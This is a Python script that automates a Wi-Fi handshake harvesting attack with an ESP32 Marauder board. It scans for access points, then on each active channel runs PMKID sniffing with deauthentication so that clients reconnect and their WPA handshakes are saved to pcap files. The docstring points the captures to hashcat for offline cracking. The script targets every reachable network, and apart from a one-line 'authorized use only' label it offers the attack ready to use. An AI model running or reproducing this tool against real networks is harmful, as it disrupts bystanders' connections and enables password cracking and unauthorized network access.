#!/usr/bin/env python3
"""
handshake_harvester.py -- unattended PMKID/EAPOL sweep across a whole area.

  scan APs  ->  figure out which channels are actually in use  ->  walk each
  channel, running `sniffpmkid -c <ch> -d` for a dwell window (the -d deauth
  nudges clients into reassociating so handshakes appear)  ->  stopscan  ->
  next channel.

One kick-off, then it captures every reachable network's handshakes to the SD
card without you touching the board. Built entirely from Marauder v1.13.0
primitives (scanap / list -a / channel discovery / sniffpmkid -c -d / stopscan).

Captures land in .pcap files on the SD card (feed them to hcxpcapngtool ->
hashcat offline). Requires an SD card. ESP32-WROOM boards (dev_board_pro /
v6_1). AUTHORIZED USE ONLY.

  python3 chains/handshake_harvester.py --dwell 45
  python3 chains/handshake_harvester.py --channels 1,6,11 --dwell 60 --port /dev/ttyUSB0
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from marauder import add_common_args, connect_from_args  # noqa: E402


def main():
    ap = argparse.ArgumentParser(description="Unattended PMKID/EAPOL channel sweep")
    add_common_args(ap)
    ap.add_argument("--scan-seconds", type=int, default=20, help="initial AP scan (default 20)")
    ap.add_argument("--dwell", type=int, default=45, help="capture seconds per channel (default 45)")
    ap.add_argument("--channels", help="comma list to force (e.g. 1,6,11). Default = channels seen in scan.")
    ap.add_argument("--all-channels", action="store_true", help="sweep 1..13 regardless of scan")
    args = ap.parse_args()

    m = connect_from_args(args)
    try:
        if args.channels:
            channels = [int(c) for c in args.channels.split(",") if c.strip()]
        elif args.all_channels:
            channels = list(range(1, 14))
        else:
            print("\n[*] Scanning {}s to find active channels ...".format(args.scan_seconds))
            aps = m.scan_aps(args.scan_seconds)
            for a in aps:
                print("      " + str(a))
            channels = sorted({a.channel for a in aps})
            if not channels:
                print("[!] No APs found; falling back to 1,6,11.")
                channels = [1, 6, 11]

        print("\n[*] Harvesting handshakes across channels: {}".format(channels))
        for ch in channels:
            print("\n[*] Channel {} -- capturing {}s (sniffpmkid -c {} -d)".format(ch, args.dwell, ch))
            m.send("sniffpmkid -c {} -d".format(ch))
            m.sleep(args.dwell)
            m.stop()
        print("\n[*] Sweep complete. Check the .pcap capture files on the SD card.")
    except KeyboardInterrupt:
        print("\n[interrupted]")
    finally:
        m.close()


if __name__ == "__main__":
    main()
